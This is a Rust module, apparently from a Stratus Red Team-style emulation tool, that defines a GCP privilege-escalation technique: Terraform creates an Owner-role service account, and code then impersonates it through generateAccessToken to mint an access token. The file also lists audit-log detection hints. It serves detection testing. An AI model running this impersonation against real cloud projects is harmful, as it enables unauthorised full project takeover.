use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    google = { source = "hashicorp/google", version = "~> 4.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

variable "project_id" {}

provider "google" { project = var.project_id }

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "google_service_account" "privileged_sa" {
  account_id   = "stratus-priv-sa-${random_string.suffix.result}"
  display_name = "Stratus Privileged Service Account (Owner)"
}

resource "google_project_iam_member" "owner" {
  project = var.project_id
  role    = "roles/owner"
  member  = "serviceAccount:${google_service_account.privileged_sa.email}"
}

output "sa_email" { value = google_service_account.privileged_sa.email }
"#;

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let sa_email = outputs
        .get("sa_email")
        .ok_or_else(|| anyhow::anyhow!("Missing output: sa_email"))?;

    // GenerateAccessToken to impersonate the privileged SA
    let url = format!(
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{}:generateAccessToken",
        sa_email
    );

    let body = serde_json::json!({
        "scope": ["https://www.googleapis.com/auth/cloud-platform"],
        "lifetime": "3600s"
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        let data: serde_json::Value = resp.json().await?;
        let impersonated_token = data["accessToken"].as_str().unwrap_or("");
        println!(
            "Successfully impersonated service account '{}' in project '{}' — obtained access token (first 20 chars: {}...)",
            sa_email,
            project,
            &impersonated_token.chars().take(20).collect::<String>()
        );
        println!("This SA has Owner role — attacker now has full project access");
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to impersonate service account ({}): {}. \
             The caller must have roles/iam.serviceAccountTokenCreator on this SA.",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.privilege-escalation.impersonate-service-accounts",
        friendly_name: "Impersonate GCP Service Account with Owner Role",
        description: "Uses the IAM Credentials API GenerateAccessToken to impersonate a privileged GCP service account with the Owner role, escalating privileges and generating a detectable audit log event.",
        detection: "GCP Audit Log: iam.serviceAccounts.generateAccessToken by unexpected caller. Cloud Security Command Center: Service account impersonation alert.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: None,
    }
}
